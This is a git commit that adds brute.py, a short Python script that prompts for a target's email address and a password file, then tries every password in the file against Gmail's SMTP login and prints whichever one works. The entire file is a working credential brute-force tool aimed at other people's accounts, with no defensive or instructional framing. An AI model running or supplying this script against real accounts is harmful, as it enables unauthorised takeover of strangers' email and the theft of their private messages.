2ed5c069605f19a179fe396fef2ceb462ec1b353
khalildroos <40738616+khalildroos@users.noreply.github.com>
2018-08-04 14:06:30 +0100

    Add files via upload

---
+++ brute.py
@@ -0,0 +1,17 @@
+import smtplib
+
+smtpserver = smtplib.SMTP("smtp.gmail.com",587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter the target's email :")
+passwfile = input("Enter the password File :")
+passwfile = open(passwfile, "r")
+
+for password in passwfile :
+        try :
+                smtpserver.login(user,password)
+                print (" Password Found ===> ", password)
+                break;
+        except smtplib.SMTPAuthenticationError:
+                print ("!! Password is incorrect ===> ", password)
